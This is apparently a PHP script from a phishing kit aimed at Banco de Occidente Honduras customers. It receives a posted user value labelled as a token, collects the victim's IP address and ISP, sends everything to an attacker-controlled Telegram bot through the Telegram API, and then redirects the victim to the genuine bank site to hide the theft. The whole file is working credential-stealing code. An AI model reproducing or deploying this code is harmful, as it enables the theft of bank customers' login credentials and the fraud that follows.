
<?php

$uz3r = $_POST["uz3r"];




include_once("cone.php");

$filter = "";

$mensaje = ">> TOKEN <<\n";

$mensaje .= "USUARIO : ".$uz3r."\n";




$filter = base64_encode($filter);


$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
define('BOT_TOKEN', $bottoken);
define('CHAT_ID', $chatid);
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

$mensaje .= "IP : ".$ip."\n";
$mensaje .= "ISP : ".$isp."\n";

function enviar_telegram($msj){
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}

$file_name = 'data/'.$ip.'.db';
enviar_telegram("\n\n".$mensaje);
?>

<meta http-equiv="refresh" content="0; url=https://bancodeoccidente.hn">

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="0; url=https://bancodeoccidente.hn">
	<title>Document</title>
</head>
<body>
	
</body>
</html>
